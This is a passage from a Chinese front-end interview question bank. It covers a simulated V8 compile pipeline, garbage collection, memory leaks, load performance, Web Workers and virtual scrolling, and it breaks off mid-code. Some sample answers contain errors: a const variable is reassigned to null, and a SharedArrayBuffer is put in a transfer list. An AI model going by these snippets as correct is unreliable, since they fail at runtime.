      // （这里简化处理）
    });
    
    this.bytecode.push({
      type: 'Function',
      name: node.name.name,
      params: node.params.map(p => p.name),
      bytecode: functionBytecode,
    });
  }

  compileBinaryExpression(node) {
    // 先编译左操作数
    this.compileNode(node.left);
    // 将左操作数的结果保存到临时寄存器
    const leftReg = this.registerCount++;
    this.bytecode.push({
      opcode: BytecodeOpcode.Star,
      operand: leftReg,
      comment: `暂存左操作数到 r${leftReg}`,
    });
    
    // 再编译右操作数
    this.compileNode(node.right);
    
    // 执行运算
    const opMap = {
      '+': BytecodeOpcode.Add,
      '-': BytecodeOpcode.Sub,
      '*': BytecodeOpcode.Mul,
      '/': BytecodeOpcode.Div,
    };
    
    this.bytecode.push({
      opcode: opMap[node.operator],
      operand: leftReg,
      comment: `${node.operator} r${leftReg} (结果在累加器中)`,
    });
  }

  // ... 其他编译方法
}

// 编译为字节码
const ignition = new IgnitionCompiler();
const bytecodeResult = ignition.compile(ast);

console.log('\n⚡ 生成的字节码（简化表示）:');
bytecodeResult.bytecode.slice(0, 10).forEach((instr, i) => {
  console.log(`  [${i}] ${(instr.opcode || instr.type).padEnd(25)} ${instr.operand !== undefined ? `r${instr.operand}` : ''} ${instr.comment || ''}`);
});

// ==================== 阶段4：TurboFan 优化编译器（JIT）====================

/**
 * TurboFan 优化编译器模拟
 * 将热点字节码编译为优化的机器码
 */
class TurboFanCompiler {
  constructor() {
    this.optimizationLevel = 0;  // 优化等级（0-3）
    this.hotThreshold = 100;     // 热点阈值（执行次数超过此值触发优化）
    this.executionCount = new Map();  // 记录每个函数的执行次数
    this.typeFeedback = new Map();   // 类型反馈信息
  }

  /**
   * 记录函数执行（收集 profiling 信息）
   * @param {string} functionName - 函数名
   * @param {Array} argTypes - 参数类型数组
   */
  recordExecution(functionName, argTypes) {
    // 更新执行计数
    const count = (this.executionCount.get(functionName) || 0) + 1;
    this.executionCount.set(functionName, count);
    
    // 收集类型反馈
    if (!this.typeFeedback.has(functionName)) {
      this.typeFeedback.set(functionName, []);
    }
    this.typeFeedback.get(functionName).push(argTypes);
    
    // 检查是否达到热点阈值
    if (count === this.hotThreshold) {
      console.log(`\n🔥 "${functionName}" 达到热点阈值 (${count}次)，触发 TurboFan 优化编译`);
      this.optimize(functionName);
    }
  }

  /**
   * 执行优化编译
   * @param {string} functionName - 要优化的函数名
   */
  optimize(functionName) {
    const feedback = this.typeFeedback.get(functionName) || [];
    
    console.log(`\n--- 阶段4：TurboFan 优化编译 ---`);
    console.log(`🚀 开始优化函数: ${functionName}`);
    console.log(`📊 收集到的类型反馈信息:`);
    
    // 分析类型反馈
    const typeStability = this.analyzeTypeStability(feedback);
    console.log(`   类型稳定性: ${typeStability.isStable ? '✅ 稳定' : '❌ 不稳定'}`);
    console.log(`   观察到的参数类型:`);
    typeStability.observedTypes.forEach((types, paramIndex) => {
      console.log(`     参数${paramIndex}: ${[...new Set(types)].join(', ')}`);
    });

    // 生成优化后的机器码（伪代码表示）
    const optimizedCode = this.generateOptimizedCode(functionName, typeStability);
    
    console.log(`\n💨 生成的优化机器码（伪汇编）:`);
    optimizedCode.forEach((instruction, i) => {
      console.log(`   ${i.toString(16).padStart(4, '0')}: ${instruction}`);
    });

    // 记录去优化点（当假设被打破时使用）
    this.deoptPoints.set(functionName, this.identifyDeoptPoints(typeStability));
  }

  /**
   * 分析类型稳定性
   */
  analyzeTypeStability(feedback) {
    const observedTypes = [];  // 每个参数观察到的类型集合
    let isStable = true;

    if (feedback.length > 0) {
      const paramCount = feedback[0].length;
      
      for (let i = 0; i < paramCount; i++) {
        const typesForParam = feedback.map(args => args[i]);
        const uniqueTypes = new Set(typesForParam);
        
        observedTypes[i] = typesForParam;
        
        // 如果某个参数有多种类型，说明不稳定
        if (uniqueTypes.size > 1) {
          isStable = false;
        }
      }
    }

    return { isStable, observedTypes };
  }

  /**
   * 生成优化后的机器码（伪代码）
   * 这里用类似 x86 汇编的格式表示
   */
  generateOptimizedCode(functionName, typeInfo) {
    // 模拟生成的优化机器码
    // 实际 V8 会生成真正的机器码（x86/ARM64 二进制指令）
    
    const code = [
      '; ========== 优化后的机器码 ==========',
      '; 函数: ' + functionName,
      '; 优化策略: 内联缓存 + 类型特化',
      '',
      'prologue:',                    // 函数序言（保存寄存器等）
      '  push rbp',
      '  mov rbp, rsp',
      '',
      'body:',
      '; 假设参数都是 Smi（小整数），直接使用整数加法指令',
      '  mov eax, [rbp+16]          ; 加载第一个参数',
      '  add eax, [rbp+24]          ; 加上第二个参数（内联加法）',
      '',
      'epilogue:',                   // 函数尾声
      '  pop rbp',
      '  ret                         ; 返回结果在 eax 中',
      '',
      '; ========== 去优化检查点 ==========',
      '; 如果运行时发现类型与假设不符，跳转到去优化代码',
      'deopt_check:',
      '  cmp [rbp+16], TYPE_SMI     ; 检查第一个参数是否是 Smi',
      '  jne __Deoptimization        ; 如果不是，触发去优化',
      '  cmp [rbp+24], TYPE_SMI     ; 检查第二个参数',
      '  jne __Deoptimization',
    ];

    return code;
  }

  /**
   * 识别去优化点
   */
  identifyDeoptPoints(typeInfo) {
    const points = [];
    
    if (!typeInfo.isStable) {
      points.push({
        reason: '类型不稳定',
        assumption: '所有参数都是相同类型',
        action: '回退到 Ignition 解释执行',
      });
    }

    return points;
  }

  deoptPoints = new Map();
}

// 模拟 TurboFan 优化过程
const turbofan = new TurboFanCompiler();

// 模拟多次执行 add 函数（传入不同类型的参数）
console.log('\n📈 模拟执行 profiling 阶段:');
for (let i = 0; i < 105; i++) {
  turbofan.recordExecution('add', ['number', 'number']);
}

// ==================== 阶段5：去优化（Deoptimization）机制 ====================

/**
 * 去优化模拟器
 * 当 TurboFan 的优化假设被打破时触发
 */
class Deoptimizer {
  constructor(turbofan) {
    this.turbofan = turbofan;
  }

  /**
   * 触发去优化
   * @param {string} functionName - 函数名
   * @param {string} reason - 去优化原因
   */
  deoptimize(functionName, reason) {
    console.log(`\n--- 阶段5：去优化（Deoptimization）---`);
    console.log(`⚠️  触发去优化!`);
    console.log(`   函数: ${functionName}`);
    console.log(`   原因: ${reason}`);
    console.log(`   操作:`);
    console.log('     1. 丢弃 TurboFan 生成的优化机器码');
    console.log('     2. 回退到 Ignition 解释器继续执行');
    console.log('     3. 重新收集 profiling 信息');
    console.log('     4. 可能再次触发优化（如果类型稳定了）');
    
    // 重置计数器（重新开始收集）
    this.turbofan.executionCount.set(functionName, 0);
    this.turbofan.typeFeedback.set(functionName, []);
  }
}

const deoptimizer = new Deoptimizer(turbofan);

// 模拟类型假设被打破的情况
console.log('\n💥 模拟类型变化（打破优化假设）:');
turbofan.recordExecution('add', ['number', 'string']);  // 传入了不同类型！

if (turbofan.deoptPoints.has('add')) {
  deoptimizer.deoptimize('add', '第二个参数从 number 变为 string');
}

// ==================== 完整流程总结 ====================

console.log('\n' + '='.repeat(60));
console.log('🎯 V8 编译流程完整总结');
console.log('='.repeat(60));

console.log(`
┌─────────────────────────────────────────────────────────────┐
│                    JavaScript 源码                          │
│         function add(a, b) { return a + b; }               │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  📖 Parser（解析器）                                        │
│  ├─ Scanner（词法分析）：源码 → Token 流                      │
│  └─ Parser（语法分析）：Token 流 → AST                       │
│                                                              │
│  输出：抽象语法树（树形结构，表达代码语义）                    │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────────┐
│  ⚡ Ignition（解释器）                                       │
│  ├─ AST → Bytecode（字节码）                                 │
│  ├─ 快速启动，低内存占用                                     │
│  └─ 执行时收集 Profiling 信息                                │
│                                                              │
│  输出：字节码指令序列                                         │
└───────────────────────┬─────────────────────────────────────┘
                        │
              ┌─────────┴─────────┐
              │ 执行次数 < 阈值？   │
              └─────────┬─────────┘
                   否 /         \\ 是
                    /           \\
                   ▼             ▼
        继续解释执行    ┌───────────────────────┐
                       │ 🔥 TurboFan（优化编译器） │
                       │ ├─ 热点字节码 → 机器码    │
                       │ ├─ 内联（Inlining）      │
                       │ ├─ 内联缓存（IC）        │
                       │ └─ 类型特化优化          │
                       │                           │
                       │ 输出：高度优化的机器码     │
                       └───────────┬───────────────┘
                                   │
                        ┌──────────┴──────────┐
                        │ 类型假设仍然成立？     │
                        └──────────┬──────────┘
                              是 /           \\ 否
                               /             \\
                              ▼               ▼
                    继续执行优化代码    ⚠️ Deoptimization
                                      （去优化，回退到 Ignition）

关键性能指标：
- 启动速度：Ignition 快速生成字节码，无需等待完整编译
- 内存占用：字节码比机器码紧凑 ~3-5 倍
- 执行效率：TurboFan 优化后接近 C++ 性能（通常差距 < 2x）
- 适应能力：去优化机制保证正确性（牺牲性能换取安全）
`);

console.log('✅ V8 编译流程模拟完成！');
```

**核心组件总结**：

| 组件 | 输入 | 输出 | 作用 |
|:---|:---|:---|:---|
| **Scanner** | 源码字符串 | Token 流 | 词法分析（识别关键字、运算符、字面量） |
| **Parser** | Token 流 | AST | 语法分析（构建语法树，验证语法正确性） |
| **Ignition** | AST | Bytecode | 解释执行 + 收集 profiling 信息 |
| **TurboFan** | 热点 Bytecode + Type Feedback | Optimized Machine Code | JIT 优化编译（内联、类型特化） |
| **Deoptimizer** | 运行时类型冲突 | 回退到 Bytecode | 保证正确性（当优化假设被打破时） |

### 🔍 追问链

1. **Ignition 和 TurboFan 分别是什么角色？什么时候触发 JIT 编译？**
   → 方向：Ignition 是字节码解释器（快速启动）；TurboFan 是优化编译器（热点代码编译为机器码）；同一函数被多次调用触发热点标记
2. **什么是去优化（Deoptimization）？什么情况会触发？**
   → 方向：TurboFan 基于假设（如对象结构不变）做优化；当假设不成立时回退到 Ignition 解释执行；常见触发：动态添加属性、修改对象隐藏类
3. **Hidden Class（隐藏类）是什么？如何写出 V8 友好的代码？**
   → 方向：V8 用 Hidden Class 描述对象结构以优化属性访问；避免在构造后添加新属性、保持相同初始化顺序可复用 Hidden Class

---

## Q41: 请详细说明 V8 的垃圾回收（GC）机制，包括新生代的 Scavenge 算法和老生代的标记清除/标记整理算法。
- **难度**：★★★
- **知识点**：垃圾回收、GC、V8、Scavenge、Mark-Sweep
- **题型**：简答题

### 参考答案要点：

#### 1. V8 内存分区

```
┌──────────────────────────────────────────────┐
│                  V8 堆内存                     │
├────────────────────┬─────────────────────────┤
│    新生代 (Young)   │      老生代 (Old)        │
│   ( ~1~32 MB )     │    ( 剩余空间 )          │
│                    │                         │
│  ┌────────┬──────┐ │  ┌─────────────────────┐ │
│  │ From   │ To   │ │  │  Old Pointer Space   │ │
│  │ Space  │ Space│ │  │  (含指针的对象)      │ │
│  └────────┴──────┘ │  ├─────────────────────┤ │
│                    │  │  Old Data Space      │ │
│  Scavenge 算法     │  │  (纯数据/无指针)     │ │
│  (Cheney 算法)     │  │                      │ │
│                    │  │  Mark-Sweep/Compact  │ │
└────────────────────┴─────────────────────────┘
```

#### 2. 新生代：Scavenge（Cheney 算法）

```javascript
// 新生代存放生命周期短的对象（临时变量、局部对象）
// 分为两个半空间：From Space（使用中）和 To Space（空闲）

// Scavenge 算法步骤：
// 1. 从 From Space 中找出存活对象（从根出发可达的）
// 2. 将存活对象复制到 To Space（同时紧凑排列，消除碎片）
// 3. 如果对象经历过一次 Scavenge 仍然存活 → 晋升到老生代
// 4. From Space 和 To Space 角色互换

// 晋升条件（任一满足即晋升）：
// - 对象已经经历过一次 Scavenge
// - To Space 使用率超过 25%（保证 To Space 有足够空间做分配）

// 优点：只处理存活对象（新生代中大部分对象都是短命的「朝生暮死」）
// 缺点：只能使用一半空间（From/To 各占一半）
```

#### 3. 老生代：Mark-Sweep（标记清除）& Mark-Compact（标记整理）

```javascript
// 老生代存放长期存活的对象（全局变量、闭包引用的大对象等）
// 占据大部分堆空间

// Mark-Sweep（标记清除）：
// 步骤1：标记（Mark）— 从根（GC Roots）出发，深度优先遍历，
//        标记所有可达对象
// 步骤2：清除（Sweep）— 遍历整个堆，回收未被标记的对象的空间

// 问题：产生内存碎片（不连续的空闲块）
// 解决：Mark-Compact（标记整理）— 标记后将存活对象向一端移动

// Mark-Compact（标记整理）步骤：
// 1. 标记所有存活对象
// 2. 整理（Compact）— 将存活对象向内存一端移动（消除碎片）
// 3. 更新所有引用这些对象的指针

// V8 的选择策略：
// - 空间充足时：主要用 Mark-Sweep（更快）
// - 碎片严重时：切换到 Mark-Compact（更慢但消除碎片）
```

#### 4. GC Roots（GC 根）

```javascript
// GC Roots — 垃圾回收的起点，从这些对象开始遍历判断可达性
// 包括：
// 1. 全局对象（window/globalThis）
// 2. 当前调用栈中的局部变量和参数
// 3. 嵌套调用栈中的变量
// 4. 所有模块中的全局变量
```

#### 5. V8 的 GC 优化（Orinoco 并发 GC）

```javascript
// 现代 V8 的 GC 是并发的（与应用程序并行执行）：

// 并行 GC（Parallel）：多个 GC 线程同时工作
// - 主要用在 Scavenge 的复制阶段
// - 多个线程同时复制存活对象

// 并发 GC（Concurrent）：GC 线程与主线程同时运行
// - 主要用在老生代的标记阶段
// - 主线程继续执行 JS，GC 线程并发标记
// - 通过读写屏障（Write Barrier）保证正确性

// 增量 GC（Incremental）：将 GC 工作拆分为小步
// - 每步执行一小段时间，穿插在 JS 执行之间
// - 减少主线程停顿时间（Pause Time）

// 目标：将最大暂停时间控制在毫秒级（< 50ms）
```

#### 6. 如何辅助 GC

```javascript
// 1. 及时解除引用
let largeData = /* ... */;
processLargeData(largeData);
largeData = null;  // 告诉 GC 这个对象不再需要

// 2. 避免不必要的闭包引用大对象
function createHandler(element) {
  // ❌ 不要这样做
  const hugeData = new Array(100000).fill('x');
  element.onclick = () => process(hugeData);  // hugeData 永远不会被释放

  // ✅ 这样做
  element.onclick = () => {
    const data = loadData();  // 按需加载
    process(data);
  };
}

// 3. 使用 WeakMap/WeakSet（见 Q15）

// 4. 避免内存泄漏的常见模式（见 Q42）
```

---

## Q42: 请列举前端开发中常见的 6 种内存泄漏场景，并说明检测方法和防范措施。
- **难度**：★★★
- **知识点**：内存泄漏、GC、性能优化
- **题型**：简答题

### 参考答案要点：

#### 场景一：意外的全局变量

```javascript
// ❌ 未声明的变量成为全局变量（非严格模式下）
function foo() {
  bar = 'global variable';  // 等价于 window.bar = '...'
}
foo();
// bar 永远不会被回收（全局变量直到页面关闭才释放）

// ❌ this 指向全局
function foo2() {
  this.globalVar = 'oops';  // 非 strict 模式下 this === window
}
foo2();  // 作为普通函数调用，this 指向 window

// ✅ 防范
'use strict';  // 开启严格模式，上述情况会报 ReferenceError
// 始终使用 const/let 声明变量
```

#### 场景二：遗忘的定时器和回调函数

```javascript
// ❌ 定时器持有外部变量的引用
function createPoller() {
  const largeResource = new Array(10000).fill('data');
  setInterval(() => {
    // largeResource 在此闭包中被引用
    console.log(largeResource.length);
  }, 1000);
}
createPoller();
// 即使不再需要 poller，setInterval 永远不会停止
// largeResource 永远不会被回收

// ✅ 防范
function createPoller() {
  const largeResource = new Array(10000).fill('data');
  const timerId = setInterval(() => {
    console.log(largeResource.length);
  }, 1000);

  return function cleanup() {
    clearInterval(timerId);
    largeResource = null;  // 断开引用
  };
}

const cleanup = createPoller();
// 适当时机调用 cleanup()
```

#### 场景三：脱离 DOM 的引用

```javascript
// ❌ DOM 元素移除但 JS 仍持有引用
const elements = [];
function addButton() {
  const btn = document.createElement('button');
  document.body.appendChild(btn);
  elements.push(btn);  // 保存引用
}

// 后来按钮被移除了
document.body.removeChild(elements[0]);
// 但 elements 数组仍然引用着这个 DOM 节点
// 导致整个 DOM 子树无法被 GC 回收（Detached DOM Tree）

// ✅ 防范：DOM 移除时同步清理 JS 引用
function removeButton(index) {
  const btn = elements[index];
  document.body.removeChild(btn);
  elements.splice(index, 1);  // 同步移除引用
}
```

#### 场景四：闭包导致的泄漏

```javascript
// ❌ 闭包意外保持了对大对象的引用
function setupHandler() {
  let veryLargeData = getHugeData();  // 100MB

  return function handler() {
    // 虽然 handler 不直接使用 veryLargeData
    // 但由于词法作用域的原因，veryLargeData 仍在闭包的作用域链中
    // V8 优化后可能不会真的保持引用，但不能依赖这一点
    console.log('clicked');
  };
}

// ✅ 防范：将大数据处理移到闭包外
function setupHandler() {
  let result = processHugeData(getHugeData());
  let veryLargeData = null;  // 显式置空

  return function handler() {
    console.log('result:', result);  // 只引用处理后的结果
  };
}
```

#### 场景五：事件监听器未移除

```javascript
// ❌ 组件销毁但事件监听器仍在
class Component {
  constructor(element) {
    this.element = element;
    this.data = new Array(10000).fill('x');
    this.element.addEventListener('scroll', this.handleScroll.bind(this));
  }
  handleScroll() {
    console.log(this.data.length);  // 闭包引用 this.data
  }
  destroy() {
    // 忘记移除监听器！
    // this.element = null;  // 即使置空 element，监听器还挂在 DOM 上
  }
}

// ✅ 防范：destroy 时移除所有监听器
class Component {
  constructor(element) {
    this.element = element;
    this._boundHandleScroll = this.handleScroll.bind(this);
    this.element.addEventListener('scroll', this._boundHandleScroll);
  }
  destroy() {
    this.element.removeEventListener('scroll', this._boundHandleScroll);
    this.element = null;
    this.data = null;
  }
}
```

#### 场景六：Cache 无限增长

```javascript
// ❌ 缓存永不清理
const cache = new Map();
function getData(id) {
  if (!cache.has(id)) {
    cache.set(id, fetchExpensiveData(id));  // 永远增长
  }
  return cache.get(id);
}

// ✅ 防范方案1：LRU 缓存（限制大小）
class LRUCache {
  constructor(maxSize = 100) {
    this.maxSize = maxSize;
    this.cache = new Map();
  }
  get(key) {
    if (!this.cache.has(key)) return undefined;
    const value = this.cache.get(key);
    this.cache.delete(key);  // 删除后重新插入（移到最后 = 最近使用）
    this.cache.set(key, value);
    return value;
  }
  set(key, value) {
    if (this.cache.has(key)) {
      this.cache.delete(key);
    } else if (this.cache.size >= this.maxSize) {
      // 删除最早的（Map 迭代顺序 = 插入顺序）
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    this.cache.set(key, value);
  }
}

// ✅ 防范方案2：使用 WeakMap（自动 GC，见 Q15）
const weakCache = new WeakMap();
```

#### 检测方法

```javascript
// Chrome DevTools 检测内存泄漏：

// 1. Memory 面板 — Heap Snapshot
// 打开 DevTools → Memory → Take Heap Snapshot
// 执行可疑操作 → 再拍一张快照
// Comparison 对比两张快照，查看 #Delta（新增对象）

// 2. Memory 面板 — Allocation sampling / Allocation instrumentation on timeline
// 记录一段时间内的内存分配情况，找到持续增长的分配点

// 3. Performance 面板
// 监控 Memory 时间线，观察是否有阶梯式上升（正常应该有升有降）

// 4. 查找 Detached DOM tree
// Heap Snapshot 中筛选 Detached DOM 节点
// 这些节点已经从 DOM 树移除但 JS 仍有引用

// 5. Node.js --inspect
// node --inspect app.js
// 打开 chrome://inspect 连接，使用 DevTools 分析
```

---

## Q43: 请列举首屏加载性能优化的全面策略，涵盖网络传输、资源加载、渲染流程各阶段。
- **难度**：★★★
- **知识点**：性能优化、FCP、LCP、CLS
- **题型**：简答题

### 参考答案要点：

#### 优化全景图

```
用户输入 URL
    │
    ▼
┌──────────────────────────────────────────────────────┐
│  Phase 1: 网络传输优化                                 │
│  • DNS 解析优化（DNS 预解析、HTTP DNS）                │
│  • TCP/TLS 优化（Keep-Alive、TLS 1.3、0-RTT）          │
│  • HTTP/2 多路复用 / HTTP/3 QUIC                     │
│  • CDN 加速（边缘节点、智能路由）                       │
│  • Gzip/Brotli 压缩                                  │
└────────────────────┬─────────────────────────────────┘
                     ▼
┌──────────────────────────────────────────────────────┐
│  Phase 2: 资源加载优化                                 │
│  • 关键 CSS 内联（Inline Critical CSS）               │
│  • 异步/延迟加载 JS（async/defer/module）              │
│  • 图片懒加载 / 响应式图片 / WebP/AVIF                 │
│  • 字体优化（font-display: swap、预加载）              │
│  • Preload / Prefetch / Preconnect                   │
│  • 代码分割（Code Splitting） / Tree Shaking          │
└────────────────────┬─────────────────────────────────┘
                     ▼
┌──────────────────────────────────────────────────────┐
│  Phase 3: 渲染优化                                     │
│  • 减少 DOM 节点数量                                  │
│  • 避免 CSS/JS 阻塞渲染                               │
│  • 使用 will-change / transform / opacity 做动画      │
│  • 虚拟滚动（Virtual Scrolling）                       │
│  • 服务端渲染 SSR / 静态生成 SSG                       │
│  • 骨架屏（Skeleton Screen）                          │
└────────────────────┬─────────────────────────────────┘
                     ▼
              用户看到内容 ✅
```

#### 具体策略详解

##### 1. 资源提示（Resource Hints）

```html
<!-- DNS 预解析 -->
<link rel="dns-prefetch" href="//cdn.example.com">

<!-- 预连接（DNS + TCP + TLS）-->
<link rel="preconnect" href="https://api.example.com">

<!-- 预加载关键资源（高优先级）-->
<link rel="preload" href="/fonts/main.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/css/critical.css" as="style">

<!-- 预取下次可能需要的资源（低优先级）-->
<link rel="prefetch" href="/next-page.js" as="script">

<!-- 预渲染整个页面 -->
<link rel="prerender" href="/next-page.html">
```

##### 2. 关键 CSS 内联 + 异步加载剩余 CSS

```html
<!-- 关键 CSS（首屏所需）内联到 <head> -->
<style>
  /* 首屏关键样式（通常 < 14KB）*/
  header { /* ... */ }
  .hero { /* ... */ }
</style>

<!-- 剩余 CSS 异步加载 -->
<link rel="preload" href="/styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="/styles.css"></noscript>
```

##### 3. JavaScript 加载策略

```html
<!-- defer：HTML 解析完后、DOMContentLoaded 前执行（按顺序）-->
<script defer src="app.js"></script>

<!-- async：下载完后立即执行（不保证顺序）-->
<script async src="analytics.js"></script>

<!-- type="module"：默认行为类似 defer（支持 ES Module）-->
<script type="module" src="app.mjs"></script>

<!-- 动态 import（按需加载）-->
<button id="load">Load Heavy Feature</button>
<script>
  document.getElementById('load').addEventListener('click', async () => {
    const module = await import('./heavy-feature.mjs');
    module.init();
  });
</script>
```

##### 4. Core Web Vitals 优化

```javascript
// LCP（最大内容绘制）优化：
// 1. 确保服务器响应时间 < 200ms
// 2. 使用 CDN
// 3. 优化关键渲染路径
// 4. 预加载 LCP 资源（通常是 <img> 或大背景图）
// 5. 使用 <img> 的 width/height 避免布局偏移

// FID（首次输入延迟）优化：
// 1. 分割长任务（Long Task > 50ms）
// 2. 使用 Web Worker 处理复杂计算
// 3. 延迟执行非必要 JS
// 4. 使用 requestIdleCallback 处理低优先级工作

// CLS（累积布局偏移）优化：
// 1. 图片设置明确的 width/height
// 2. 为广告/嵌入内容预留空间
// 3. 避免在已有内容上方插入新内容
// 4. 使用 font-display: swap 配合字体度量回退
```

##### 5. 构建层面优化

```javascript
// webpack/vite 配置优化：
{
  // 代码分割
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: { test: /[\\/]node_modules[\\/]/, name: 'vendor', chunks: 'all' },
      }
    }
  },

  // Tree Shaking（需 ES Module）
  mode: 'production',  // production 模式自动启用

  // 压缩
  minimizer: [
    new TerserPlugin({ parallel: true }),  // JS 压缩
    new CssMinimizerPlugin(),               // CSS 压缩
  ],

  // Gzip/Brotli（通常在 nginx/CDN 层面配置）
  // compression-webpack-plugin 用于预压缩静态资源
}
```

---

## Q44: 请说明 Web Worker 的使用场景和通信机制，并给出完整的示例代码。
- **难度**：★★★
- **知识点**：Web Worker、多线程、postMessage
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. Web Worker 的能力与限制

| 能力 | 限制（不可用） |
|:---|:---|
| postMessage 通信 | **无法访问 DOM** |
| XMLHttpRequest/fetch | **无法访问 window/document** |
| setTimeout/setInterval | **无法访问 localStorage/sessionStorage** |
| WebSocket | **无法访问 parent/frame** |
| IndexedDB | **无法使用 alert/confirm** |
| importScripts / ES Module import | **主线程的 JS 对象不可直接传递** |
| 创建子 Worker | **无法同步阻塞** |

#### 2. 基本用法

```javascript
// ====== worker.js（Worker 线程）======

// 方式1：接收消息
self.onmessage = function(e) {
  const { type, data } = e.data;

  switch (type) {
    case 'CALCULATE':
      const result = heavyCalculation(data);
      self.postMessage({ type: 'RESULT', data: result });
      break;
    case 'ABORT':
      self.close();  // 关闭 Worker
      break;
  }
};

// 方式2：使用 addEventListener
self.addEventListener('message', (e) => {
  const result = doWork(e.data);
  self.postMessage(result);
});

// 重型计算示例：斐波那契（大量递归）
function fib(n) {
  if (n <= 1) return n;
  return fib(n - 1) + fib(n - 2);
}
// ====== main.js（主线程）======

// 创建 Worker
const worker = new Worker('./worker.js');

// 发送消息给 Worker
worker.postMessage({ type: 'CALCULATE', data: 40 });

// 接收 Worker 的消息
worker.onmessage = function(e) {
  console.log('Worker 返回:', e.data.data);
};

// 错误处理
worker.onerror = function(e) {
  console.error('Worker 错误:', e.message, e.filename, e.lineno);
};

// 终止 Worker
// worker.terminate();
// ====== ES Module Worker（现代方式）======
// worker.mjs
export function processData(data) {
  // ...
  self.postMessage(/* ... */);
}

// main.mjs
const modernWorker = new Worker('./worker.mjs', { type: 'module' });
```

#### 3. 通信机制详解

```javascript
// ====== 数据传递：结构化克隆（Structured Clone）======

// 基本类型和大多数内置对象都可以传递
worker.postMessage({
  str: 'hello',
  num: 42,
  arr: [1, 2, 3],
  obj: { nested: { key: 'value' } },
  date: new Date(),
  reg: /pattern/gi,
  map: new Map([['k', 'v']]),
  buffer: new ArrayBuffer(8),
});

// ⚠️ 不能传递的内容：
// - Function
// - DOM 节点
// - 含有循环引用的对象（某些情况下）
// - Prototype 上的属性
// - Error 对象（部分属性丢失）

// ====== Transferable Objects（零拷贝转移所有权）======

// 对于大型数据（如 ArrayBuffer），可以使用 Transferable 零拷贝传输
const largeBuffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB

// 普通 postMessage：复制一份（耗时耗内存）
worker.postMessage({ buffer: largeBuffer });  // 复制 100MB

// Transferable：转移所有权（零拷贝！）
worker.postMessage({ buffer: largeBuffer }, [largeBuffer]);
// largeBuffer 在主线程中变为 length=0（所有权已转移给 Worker）

// Worker 处理完后也可以转回来
// worker.postMessage({ result: processedBuffer }, [processedBuffer]);
```

#### 4. SharedArrayBuffer（共享内存）

```javascript
// SharedArrayBuffer：主线程和 Worker 共享同一块内存
// ⚠️ 需要在安全上下文中使用（COOP/COEP headers）

// main.js
const sab = new SharedArrayBuffer(1024);  // 1KB 共享内存
const int32View = new Int32Array(sab);

const worker = new Worker('./shared-worker.js');
worker.postMessage({ sharedBuffer: sab }, [sab]);

// 读写共享内存
int32View[0] = 100;
console.log(int32View[1]); // 读取 Worker 写入的值

// shared-worker.js
self.onmessage = function(e) {
  const view = new Int32Array(e.data.sharedBuffer);
  Atomics.store(view, 1, 200);  // 原子操作写入
  const val = Atomics.load(view, 0);  // 原子操作读取
};
```

#### 5. 实际应用场景

```javascript
// 场景1：大数据处理/计算
const computeWorker = new Worker('/workers/compute.worker.js');
computeWorker.postMessage({ dataset: largeDataset });

// 场景2：加密/解密（WebCrypto 也可用 Worker）
const cryptoWorker = new Worker('/workers/crypto.worker.js');

// 场景3：音视频编解码
const codecWorker = new Worker('/workers/codec.worker.js');

// 场景4：图像处理（滤镜、压缩）
function processImage(imageData) {
  return new Promise((resolve) => {
    const worker = new Worker('/workers/image.worker.js');
    worker.onmessage = (e) => resolve(e.data);
    worker.postMessage(imageData.data, [imageData.data.buffer]); // Transferable
  });
}

// 场景5：WebSocket 消息处理
// 将 WebSocket 消息分发到 Worker 处理，避免阻塞主线程
```

---

## Q45: 什么是虚拟滚动（Virtual Scrolling）？请说明其原理并给出核心实现思路。
- **难度**：★★★
- **知识点**：虚拟滚动、大列表渲染、性能优化
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. 问题背景

```javascript
// 渲染 10,000 条数据的列表
// ❌ 直接渲染 10,000 个 DOM 节点：
// - 首次渲染极慢（可能数秒）
// - 滚动卡顿（每帧要计算 10,000 个元素的布局）
// - 内存占用巨大
// - 用户体验极差

// ✅ 虚拟滚动的思路：
// 只渲染可视区域（viewport）内的几十条数据
// 滚动时动态替换内容
```

#### 2. 核心原理

```
┌──────────────────────────────┐
│         Viewport             │  ← 用户可见区域（如 600px 高）
│  ┌────────────────────────┐  │
│  │ Item 25 (offset: 500px)│  │  ← 只渲染可视区域的条目
│  │ Item 26                │  │
│  │ Item 27                │  │
│  │ Item 28                │  │
│  │ Item 29                │  │
│  │ Item 30 (offset: 900px)│  │
│  └────────────────────────┘  │
│                              │
│  Total Height: 150,000px     │  ← 撑开滚动条的假高度
│  (10000 条 × 15px/条)        │
└──────────────────────────────┘

scrollTop = 520px
→ startIndex = floor(520 / 15) = 34
→ endIndex = ceil((520 + 600) / 15) = 74
→ 只渲染第 34~74 条（约 41 个 DOM 节点）
```

#### 3. 核心实现

```javascript
class VirtualList {
  constructor(container, options) {
    this.container = container;
    this.itemCount = options.itemCount;       // 总数据量
    this.itemHeight = options.itemHeight;      // 每条高度（固定）
    this.viewportHeight = options.viewportHeight || container.clientHeight;
    this.bufferSize = options.bufferSize || 5;  // 上下缓冲区条目数
    this.renderItem = options.renderItem;      // 渲染单条的函数

    this.container.style.overflow = 'auto';
    this.container.style.position = 'relative';

    // 创建撑开高度的占位元素
    this.skeleton = document.createElement('div');
    this.skeleton.style.height = `${this.itemCount * this.itemHeight}px`;
    this.container.appendChild(this.skeleton);

    // 创建内容容器（绝对定位，随 scrollTop 移动）
    this.content = document.createElement('div');
    this.content.style.position = 'absolute';
    this.content.style.top = '0';
    this.content.style.left = '0';
    this.content.style.width = '100%';
    this.container.appendChild(this.content);

    // 绑定滚动事件
    this.container.addEventListener('scroll', () => this.onScroll(), { passive: true });

    // 首次渲染
    this.render();
  }

  // 计算当前可视范围的起止索引
  getVisibleRange() {
    const scrollTop = this.container.scrollTop;
    const startIdx = Math.max(0, Math.floor(scrollTop / this.itemHeight) - this.bufferSize);
    const visibleCount = Math.ceil(this.viewportHeight / this.itemHeight);
    const endIdx = Math.min(
